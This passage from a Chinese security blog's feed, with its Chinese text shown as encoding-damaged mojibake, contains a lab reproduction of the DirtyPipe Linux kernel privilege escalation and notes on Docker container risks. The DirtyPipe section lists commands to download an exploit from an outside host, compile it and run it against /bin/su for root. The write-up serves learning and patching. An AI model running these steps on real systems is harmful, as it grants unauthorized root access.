æ­¤è„šæœ¬æš‚æ—¶è¿˜ä¸æ”¯æŒè¿™å—å„¿çš„æ£€æµ‹ã€‚</li></ul><blockquote><p> æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h1&gt;&lt;p&gt;æœ€è¿‘æäº†ä¸ªæ£€æµ‹ Docker å®¹å™¨é€ƒé€¸çš„è„šæœ¬ï¼Œç›®å‰æ”¯æŒä»¥ä¸‹å‡ ç§æ–¹æ³•çš„æ£€æµ‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¤„äºç‰¹æƒæ¨¡å¼&lt;/li&gt;
&lt;li&gt;æŒ‚è½½äº†</summary>
      
    
    
    
    <category term="å·¥å…·åˆ†äº«" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="å®¹å™¨" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
    <category term="å®¹å™¨é€ƒé€¸" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ¼æ´å¤ç°ã€‘DirtyPipe CVE-2022-0847 Linux å†…æ ¸ææƒæ¼æ´å¤ç°</title>
    <link href="https://www.teamssix.com/220308-120008.html"/>
    <id>https://www.teamssix.com/220308-120008.html</id>
    <published>2022-03-08T04:00:08.000Z</published>
    <updated>2022-03-08T08:19:12.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>CVSS è¯„åˆ†ï¼š7.8</p><p>å½±å“èŒƒå›´ï¼š5.8 &lt;= Linux å†…æ ¸ç‰ˆæœ¬ &lt; 5.16.11 / 5.15.25 / 5.10.102</p><p>RT é€šè¿‡ CVE-2022-0847 å¯è¦†ç›–é‡å†™ä»»æ„å¯è¯»æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œå¯å°†æ™®é€šæƒé™çš„ç”¨æˆ·æå‡åˆ°ç‰¹æƒ root</p><p>è¿™ä¸ªæ¼æ´ä½œè€…å°†å…¶å‘½åä¸ºäº† Dirty Pipeï¼Œä¸€çœ‹åˆ°è¿™åå­—è®²é“ç†å°±è®©äººæƒ³åˆ°äº† Dirty Cowï¼Œè¿™æ˜¯å› ä¸ºè¯¥æ¼æ´çš„åŸç†æ¯”è¾ƒç±»ä¼¼äº Dirty Cowï¼Œä½†è¿™ä¸ªæ¼æ´æ›´å®¹æ˜“è¢«åˆ©ç”¨ã€‚</p><h1 id="0x01-æ¼æ´æ£€æµ‹"><a href="#0x01-æ¼æ´æ£€æµ‹" class="headerlink" title="0x01 æ¼æ´æ£€æµ‹"></a>0x01 æ¼æ´æ£€æµ‹</h1><p>æ£€æµ‹çš„æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥ uname -r ï¼Œå¦‚æœ  5.8 &lt;= Linux å†…æ ¸ç‰ˆæœ¬ &lt; 5.16.11 / 5.15.25 / 5.10.102 è¯´æ˜å¯èƒ½å—åˆ°è¯¥æ¼æ´çš„å½±å“ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203032.png" alt="img"></p><h1 id="0x02-ç¯å¢ƒæ­å»º"><a href="#0x02-ç¯å¢ƒæ­å»º" class="headerlink" title="0x02 ç¯å¢ƒæ­å»º"></a>0x02 ç¯å¢ƒæ­å»º</h1><blockquote><p>å»ºè®®åœ¨æ­å»ºç¯å¢ƒå‰ï¼Œå…ˆæ‰“å¥½å¿«ç…§</p></blockquote><p>ç¯å¢ƒä¾èµ–ï¼š</p><ul><li>Ubuntu 16.04 æˆ– 18.04ï¼ˆæ¨èï¼‰</li><li>Python &gt;= 3.6 (ä¸æ”¯æŒPython 2.xï¼)</li><li>pip3</li></ul><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brant-ruan&#x2F;metarget.gitcd metarget&#x2F;pip3 install -r requirements.txtsudo .&#x2F;metarget cnv install cve-2022-0847<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202460.png" alt="img"></p><p>ç¯å¢ƒæ­å»ºå¥½åï¼ŒæŸ¥çœ‹å½“å‰ç³»ç»Ÿå†…æ ¸</p><pre class="line-numbers language-none"><code class="language-none">uname -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081202399.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå†…æ ¸å·²ç»æ˜¯ 5.8 çš„äº†ï¼Œè¯´æ˜æ˜¯å¯èƒ½å—åˆ°è¯¥æ¼æ´çš„å½±å“äº†ã€‚</p><h1 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h1><h2 id="æ–¹æ³•ä¸€ï¼šCVE-2022-0847-DirtyPipe-Exploit"><a href="#æ–¹æ³•ä¸€ï¼šCVE-2022-0847-DirtyPipe-Exploit" class="headerlink" title="æ–¹æ³•ä¸€ï¼šCVE-2022-0847-DirtyPipe-Exploit"></a>æ–¹æ³•ä¸€ï¼šCVE-2022-0847-DirtyPipe-Exploit</h2><p>æŠŠ POC git ä¸‹æ¥</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploitcd CVE-2022-0847-DirtyPipe-Exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¼€å§‹ææƒ</p><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit.&#x2F;exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203539.png" alt="img"></p><p>æˆ‘è¿™é‡Œæç¤º su: must be run from a terminalï¼Œæ²¡ææƒæˆåŠŸã€‚</p><p>æ ¹æ®ä½œè€…çš„è§£é‡Šï¼Œä»–çš„ç”µè„‘å¿«æ²¡ç”µäº†ï¼Œæ‰€ä»¥æš‚æ—¶è¿˜æ²¡æ—¶é—´è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿™ â€¦â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203449.png" alt="img"></p><h2 id="æ–¹æ³•äºŒï¼šdirtypipez-c"><a href="#æ–¹æ³•äºŒï¼šdirtypipez-c" class="headerlink" title="æ–¹æ³•äºŒï¼šdirtypipez.c"></a>æ–¹æ³•äºŒï¼šdirtypipez.c</h2><p>åæ¥çœ‹ p ç‰›è¯´åˆ°äº†ç½‘ä¸Šçš„å…¶ä»– POCï¼Œä¸‹é¢è¿™ä¸ª POC æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ˜¯å¯ä»¥ææƒçš„</p><pre class="line-numbers language-none"><code class="language-none">mkdir dirtypipezcd dirtypipezwget https:&#x2F;&#x2F;haxx.in&#x2F;files&#x2F;dirtypipez.cgcc dirtypipez.c -o dirtypipez<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081203441.png" alt="img"></p><p>è¿™ä¸ª POC éœ€è¦äº‹å…ˆæ‰¾åˆ°ä¸€ä¸ªå…·æœ‰ SUID æƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæ–‡ä»¶è¿›è¡Œææƒ</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°è¿™ç±»æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204857.png" alt="img"></p><p>è¿™é‡Œå°±ä»¥ /bin/su ä¸ºä¾‹äº†ï¼Œç›´æ¥ ./dirtypipez è·Ÿä¸Šå…·æœ‰ SUID æƒé™çš„æ–‡ä»¶å³å¯ææƒ</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;dirtypipez &#x2F;bin&#x2F;su <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203081204783.png" alt="img"></p><h1 id="0x04-æ¼æ´ä¿®å¤"><a href="#0x04-æ¼æ´ä¿®å¤" class="headerlink" title="0x04 æ¼æ´ä¿®å¤"></a>0x04 æ¼æ´ä¿®å¤</h1><p>æ›´æ–°å‡çº§ Linux å†…æ ¸åˆ°ä»¥ä¸‹å®‰å…¨ç‰ˆæœ¬ï¼š</p><ul><li>Linux å†…æ ¸ &gt;= 5.16.11</li><li>Linux å†…æ ¸ &gt;= 5.15.25</li><li>Linux å†…æ ¸ &gt;= 5.10.102</li></ul><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://t.zsxq.com/imaqj2V">https://t.zsxq.com/imaqj2V</a></p><p><a href="https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw">https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw</a></p><p><a href="https://access.redhat.com/security/cve/cve-2022-0847">https://access.redhat.com/security/cve/cve-2022-0847</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;CVSS è¯„åˆ†ï¼š7.8&lt;/p&gt;
&lt;p&gt;å½±å“èŒƒå›´ï¼š5.8 &amp;lt;= Linux å†…æ ¸ç‰ˆæœ¬ &amp;lt; </summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="ææƒæ¼æ´" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Linux" scheme="https://www.teamssix.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ã€äº‘å®‰å…¨ã€‘å®¹å™¨åŸºç¡€è®¾æ–½æ‰€é¢ä¸´çš„é£é™©å­¦ä¹ </title>
    <link href="https://www.teamssix.com/220307-162000.html"/>
    <id>https://www.teamssix.com/220307-162000.html</id>
    <published>2022-03-07T08:20:00.000Z</published>
    <updated>2022-03-07T08:29:22.488Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä»¥ä¸‹å†…å®¹ä¸ºè‡ªå·±ä¸ªäººçš„å­¦ä¹ ç¬”è®°ï¼Œå› æ­¤å†…å®¹ä¸ä¼šå¤šä¹ˆè¯¦å®ï¼›å…¶ä¸­æœ‰äº›å†…å®¹ä¹Ÿè®¸ä¼šå­˜åœ¨é”™è¯¯ï¼Œå¦‚æœ‰é”™è¯¯æ¬¢è¿ç•™è¨€å¤„æŒ‡å‡ºï¼Œè¿˜æœ›è°…è§£ã€‚</p></blockquote><h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>è¿™é‡Œä»¥ Docker ä¸ºä¾‹ï¼Œæ¥å­¦ä¹ å­¦ä¹ å®¹å™¨åŸºç¡€è®¾æ–½ä¸­å­˜åœ¨çš„ä¸€äº›é£é™©é—®é¢˜ã€‚</p><p>ä¸‹å›¾æ˜¯ Docker å®˜æ–¹ç»™å‡ºçš„æ¶æ„å›¾ï¼Œé‡Œé¢åŒ…æ‹¬äº† Docker å®¢æˆ·ç«¯ã€Docker å®¹å™¨æ‰€åœ¨çš„å®¿ä¸»æœºå’Œ Docker é•œåƒä»“åº“ä¸‰ä¸ªéƒ¨åˆ†ã€‚</p><p>å…¶ä¸­å®¿ä¸»æœºåŒ…æ‹¬äº† Docker å®ˆæŠ¤è¿›ç¨‹ã€æœ¬åœ°å®¹å™¨å’Œæœ¬åœ°é•œåƒï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ï¼ˆdockerdï¼‰çš„ä½œç”¨æ˜¯ä¾¦å¬ Docker API è¯·æ±‚å’Œç®¡ç† Docker å¯¹è±¡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618942.png"></p><h1 id="0x01-å®¹å™¨é•œåƒå­˜åœ¨çš„é£é™©"><a href="#0x01-å®¹å™¨é•œåƒå­˜åœ¨çš„é£é™©" class="headerlink" title="0x01 å®¹å™¨é•œåƒå­˜åœ¨çš„é£é™©"></a>0x01 å®¹å™¨é•œåƒå­˜åœ¨çš„é£é™©</h1><h2 id="1ã€ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶"><a href="#1ã€ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶" class="headerlink" title="1ã€ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶"></a>1ã€ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶</h2><p>ä¾‹å¦‚å¼€å‘è€…åœ¨ä»£ç ä¸­å¼•å…¥äº†å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„ log4j2 ç»„ä»¶ï¼Œç„¶åå°†å…¶æ‰“åŒ…æˆäº†ä¸šåŠ¡é•œåƒã€‚è¿™æ ·å³ä½¿ä»£ç æ²¡æœ‰æ¼æ´ï¼Œä½†å› ä¸ºå¼•å…¥äº†ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ä¹Ÿå˜å¾—æœ‰æ¼æ´äº†ã€‚</p><p>å†æ¯”å¦‚å¼€å‘è€…åœ¨ Django é•œåƒçš„åŸºç¡€ä¸Šï¼Œç¼–å†™äº†è‡ªå·±çš„ Python ä»£ç ï¼Œç„¶åå°†å…¶æ‰“åŒ…æˆé•œåƒã€‚è¿™æ ·å¦‚æœåœ¨  Django é•œåƒé‡Œå¼•ç”¨äº†ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶æˆ–è€… Django è‡ªèº«å­˜åœ¨æ¼æ´ï¼Œè‡ªå·±æ‰“åŒ…çš„é•œåƒä¹ŸåŒæ ·ä¼šå—åˆ°å½±å“ã€‚</p><h2 id="2ã€ä¸å®‰å…¨çš„é•œåƒ"><a href="#2ã€ä¸å®‰å…¨çš„é•œåƒ" class="headerlink" title="2ã€ä¸å®‰å…¨çš„é•œåƒ"></a>2ã€ä¸å®‰å…¨çš„é•œåƒ</h2><p>åœ¨å…¬å…±é•œåƒä»“åº“æ¯”å¦‚ Docker Hub é‡Œï¼Œä¼šå­˜åœ¨ä¸€äº›æœ‰æ¼æ´çš„é•œåƒæˆ–è€…æ¶æ„é•œåƒï¼Œå¦‚æœä½¿ç”¨äº†è¿™äº›é•œåƒé‚£å°±å­˜åœ¨é£é™©äº†ã€‚</p><h2 id="3ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#3ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="3ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>3ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>å¦‚æœå¼€å‘è€…ä¸ºäº†å¼€å‘ã€è°ƒè¯•æ–¹ä¾¿ï¼Œå¯èƒ½ä¼šå°†æ•°æ®åº“è´¦å·å¯†ç ã€äº‘æœåŠ¡å¯†é’¥ä¹‹ç±»çš„æ•æ„Ÿæ•°æ®æ‰“åŒ…åˆ°äº†é•œåƒé‡Œï¼Œé‚£åˆ«äººè·å–åˆ°è¿™ä¸ªé•œåƒåï¼Œå°±ä¼šå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²äº†ã€‚</p><h1 id="0x02-æ´»åŠ¨ä¸­çš„å®¹å™¨å­˜åœ¨çš„é£é™©"><a href="#0x02-æ´»åŠ¨ä¸­çš„å®¹å™¨å­˜åœ¨çš„é£é™©" class="headerlink" title="0x02 æ´»åŠ¨ä¸­çš„å®¹å™¨å­˜åœ¨çš„é£é™©"></a>0x02 æ´»åŠ¨ä¸­çš„å®¹å™¨å­˜åœ¨çš„é£é™©</h1><h2 id="1ã€ä¸å®‰å…¨çš„å®¹å™¨åº”ç”¨"><a href="#1ã€ä¸å®‰å…¨çš„å®¹å™¨åº”ç”¨" class="headerlink" title="1ã€ä¸å®‰å…¨çš„å®¹å™¨åº”ç”¨"></a>1ã€ä¸å®‰å…¨çš„å®¹å™¨åº”ç”¨</h2><p>åœ¨ä½¿ç”¨å®¹å™¨æ—¶ï¼Œå¾€å¾€ä¼šéœ€è¦è¿›è¡Œç«¯å£æ˜ å°„ï¼Œæ¯”å¦‚æŠŠ MySQL çš„ 3306 ç«¯å£æ˜ å°„å‡ºæ¥ï¼Œå¦‚æœ MySQL è¢«é…ç½®äº†å¼±å¯†ç ï¼Œé‚£å°±å­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©äº†ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœä¸€ä¸ª Web æœåŠ¡ç«¯å£è¢«æ˜ å°„å‡ºæ¥ï¼ŒåŒæ—¶è¿™ä¸ª Web æœåŠ¡å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆä¹ŸåŒæ ·æ˜¯å­˜åœ¨é£é™©çš„ã€‚</p><h2 id="2ã€ä¸å—é™åˆ¶çš„èµ„æºå…±äº«"><a href="#2ã€ä¸å—é™åˆ¶çš„èµ„æºå…±äº«" class="headerlink" title="2ã€ä¸å—é™åˆ¶çš„èµ„æºå…±äº«"></a>2ã€ä¸å—é™åˆ¶çš„èµ„æºå…±äº«</h2><p>å®¹å™¨è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šï¼Œå®¹å™¨å¿…ç„¶è¦ä½¿ç”¨å®¿ä¸»æœºçš„å„ç§ CPUã€å†…å­˜ç­‰èµ„æºï¼Œå¦‚æœæ²¡æœ‰å¯¹å®¹å™¨è¿›è¡Œèµ„æºä½¿ç”¨é™åˆ¶ï¼Œé‚£ä¹ˆå°±å­˜åœ¨å®¿ä¸»æœºè¢«èµ„æºè€—å°½çš„é£é™©ã€‚</p><h2 id="3ã€ä¸å®‰å…¨çš„é…ç½®ä¸æŒ‚è½½"><a href="#3ã€ä¸å®‰å…¨çš„é…ç½®ä¸æŒ‚è½½" class="headerlink" title="3ã€ä¸å®‰å…¨çš„é…ç½®ä¸æŒ‚è½½"></a>3ã€ä¸å®‰å…¨çš„é…ç½®ä¸æŒ‚è½½</h2><p>å¦‚æœä¸ºå®¹å™¨è®¾å®šäº†ä¸å®‰å…¨çš„é…ç½®ï¼Œä¼šå¯¼è‡´å®¹å™¨æœ¬èº«çš„éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼Œå®¹å™¨çš„ä¸¤å¤§éš”ç¦»æœºåˆ¶å¦‚ä¸‹ï¼š</p><ul><li>Linux å‘½åç©ºé—´ï¼ˆNameSpaceï¼‰ï¼šå®ç°æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€è¿›ç¨‹ã€ä¸»æœºåç­‰æ–¹é¢çš„éš”ç¦»</li><li>Linux æ§åˆ¶ç»„ï¼ˆcgroupsï¼‰ï¼šå®ç° CPUã€å†…å­˜ã€ç¡¬ç›˜ç­‰æ–¹é¢çš„éš”ç¦»</li></ul><p>å¦‚æœè®¾å®šäº†ä»¥ä¸‹é…ç½®å°±ä¼šå¯¼è‡´ç›¸åº”çš„éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š</p><ul><li><p>â€“privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´</p></li><li><p>â€“net=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´</p></li><li><p>â€“pid=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´</p></li><li><p>â€“volume /:/hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´</p></li></ul><h1 id="0x03-å®¹å™¨ç®¡ç†ç¨‹åºæ¥å£çš„é£é™©"><a href="#0x03-å®¹å™¨ç®¡ç†ç¨‹åºæ¥å£çš„é£é™©" class="headerlink" title="0x03 å®¹å™¨ç®¡ç†ç¨‹åºæ¥å£çš„é£é™©"></a>0x03 å®¹å™¨ç®¡ç†ç¨‹åºæ¥å£çš„é£é™©</h1><p>Docker å®ˆæŠ¤è¿›ç¨‹ä¸»è¦ç›‘å¬ UNIX socket å’Œ TCP socketï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker åªä¼šç›‘å¬ UNIX socket</p><h2 id="1ã€UNIX-socket"><a href="#1ã€UNIX-socket" class="headerlink" title="1ã€UNIX socket"></a>1ã€UNIX socket</h2><p>UNIX socket çš„é£é™©ä¸»è¦åœ¨äº Docker å®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä»¥å®¿ä¸»æœºçš„ root æƒé™è¿è¡Œï¼Œå› æ­¤å°±å¯ä»¥å€ŸåŠ©è¿™ç‚¹è¿›è¡Œææƒæˆ–è€…å®¹å™¨é€ƒé€¸ã€‚</p><p>è¿™ç±»é£é™©ä¸»è¦æœ‰ä¸¤ä¸ªåˆ©ç”¨åœºæ™¯ï¼š</p><ul><li>æ™®é€šç”¨æˆ·è¢«åŠ åˆ° Docker ç”¨æˆ·ç»„å†…</li></ul><p>å¦‚æœæ™®é€šç”¨æˆ·è¢«åŠ å…¥åˆ° Docker ç”¨æˆ·ç»„å†…ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·ä¹Ÿå°†æœ‰æƒé™è®¿é—® Docker UNIX socketï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†è¿™ä¸ªæ™®é€šç”¨æˆ·æƒé™ï¼Œå°±å¯ä»¥å€ŸåŠ© Docker ææƒåˆ° root ç”¨æˆ·æƒé™ã€‚</p><p>å…·ä½“çš„åšæ³•å¯ä»¥ç®€å•æè¿°ä¸ºï¼šä½¿ç”¨æ™®é€šç”¨æˆ·åˆ›å»ºä¸€ä¸ª privileged ä¸º true çš„å®¹å™¨ï¼Œåœ¨è¯¥å®¹å™¨å†…æŒ‚è½½å®¿ä¸»æœºç¡¬ç›˜å¹¶å†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œç„¶åå°†å®¿ä¸»æœºçš„ root æƒé™åå¼¹å›æ¥ï¼ŒåæœŸå°†è¯¦ç»†ä»‹ç»è¿™ç§æ–¹æ³•çš„ä½¿ç”¨ã€‚</p><ul><li>UNIX socket æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨</li></ul><p>æœ‰æ—¶ä¸ºäº†å®ç°å®¹å™¨å†…éƒ¨ç®¡ç†å®¹å™¨ï¼Œå¯èƒ½ä¼šå°† Docker UNIX socket æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œé‚£ä¹ˆå¦‚æœè¯¥å®¹å™¨è¢«å…¥ä¾µï¼ŒRT å°±å¯ä»¥å€ŸåŠ©è¿™ä¸ª socket è¿›è¡Œå®¹å™¨é€ƒé€¸è·å¾—å®¿ä¸»æœº root æƒé™ã€‚ </p><h2 id="2ã€TCP-socket"><a href="#2ã€TCP-socket" class="headerlink" title="2ã€TCP socket"></a>2ã€TCP socket</h2><p>ç°åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä¸ä¼šç›‘å¬ TCP socketï¼Œä¸è¿‡æœ‰æ—¶å¯èƒ½ç”¨æˆ·ä¼šå› ä¸ºæ–¹ä¾¿å¼€å¯ TCP socket çš„ç›‘å¬ï¼Œä¸€èˆ¬é»˜è®¤ç›‘å¬ç«¯å£æ˜¯ 2375</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ TCP socket æ˜¯æ— åŠ å¯†æ— è®¤è¯çš„ï¼Œå› æ­¤å¦‚æœå‘ç°å®¿ä¸»æœº Docker å¼€æ”¾äº† TCP socketï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ docker -H æ¥ç®¡ç›®æ ‡çš„å®¹å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203071618407.png"></p><h1 id="0x04-å…¶ä»–é£é™©"><a href="#0x04-å…¶ä»–é£é™©" class="headerlink" title="0x04 å…¶ä»–é£é™©"></a>0x04 å…¶ä»–é£é™©</h1><h2 id="1ã€å®¹å™¨ç½‘ç»œé£é™©"><a href="#1ã€å®¹å™¨ç½‘ç»œé£é™©" class="headerlink" title="1ã€å®¹å™¨ç½‘ç»œé£é™©"></a>1ã€å®¹å™¨ç½‘ç»œé£é™©</h2><p>è™½ç„¶é»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨å†…éƒ¨çš„ç½‘ç»œä¸å®¿ä¸»æœºæ˜¯éš”ç¦»çš„ï¼Œä½†æ˜¯æ¯ä¸ªå®¹å™¨ä¹‹é—´æ˜¯å½¼æ­¤äº’ç›¸è¿é€šçš„ï¼Œç†è®ºä¸Šåœ¨å®¹å™¨ä¹‹é—´æ˜¯å­˜åœ¨å†…ç½‘æ¨ªå‘çš„é£é™©çš„ã€‚</p><h2 id="2ã€å®¿ä¸»æœºæ“ä½œç³»ç»Ÿé£é™©"><a href="#2ã€å®¿ä¸»æœºæ“ä½œç³»ç»Ÿé£é™©" class="headerlink" title="2ã€å®¿ä¸»æœºæ“ä½œç³»ç»Ÿé£é™©"></a>2ã€å®¿ä¸»æœºæ“ä½œç³»ç»Ÿé£é™©</h2><p>å®¹å™¨é€šå¸¸ä¸å®¿ä¸»æœºå…±äº«å†…æ ¸ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœå®¿ä¸»æœºå†…æ ¸å­˜åœ¨æ¼æ´ï¼Œæ„å‘³ç€å®¹å™¨å¯èƒ½ä¹Ÿä¼šå­˜åœ¨ç›¸åŒçš„æ¼æ´ã€‚</p><p>ä¾‹å¦‚å¦‚æœå®¿ä¸»æœºå­˜åœ¨è„ç‰›æ¼æ´ï¼Œé‚£ä¹ˆæ‹¿åˆ°å®¹å™¨æƒé™åï¼Œä½¿ç”¨è„ç‰›æ¼æ´å°±å¯ä»¥è·å¾—å®¿ä¸»æœºæƒé™ï¼Œå®ç°å®¹å™¨é€ƒé€¸ã€‚</p><h2 id="3ã€è½¯ä»¶è‡ªèº«çš„æ¼æ´"><a href="#3ã€è½¯ä»¶è‡ªèº«çš„æ¼æ´" class="headerlink" title="3ã€è½¯ä»¶è‡ªèº«çš„æ¼æ´"></a>3ã€è½¯ä»¶è‡ªèº«çš„æ¼æ´</h2><p>Docker è‡ªèº«å­˜åœ¨çš„ä¸€äº›æ¼æ´ï¼Œæ¯”å¦‚ CVE-2019-14271ã€CVE-2019-5736 ç­‰éƒ½å¯ä»¥å¯¼è‡´å®¹å™¨é€ƒé€¸ï¼Œè¿™äº›ä¹Ÿéƒ½æ˜¯é£é™©ç‚¹ï¼Œåé¢ä¼šå¯¹è¿™äº›æ¼æ´è¿›è¡Œå°è¯•å¤ç°ã€‚</p><blockquote><p> æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p><p> å‚è€ƒèµ„æ–™ï¼š</p><p> ã€Šäº‘åŸç”Ÿå®‰å…¨-æ”»é˜²å®è·µä¸ä½“ç³»æ„å»ºã€‹</p><p> <a 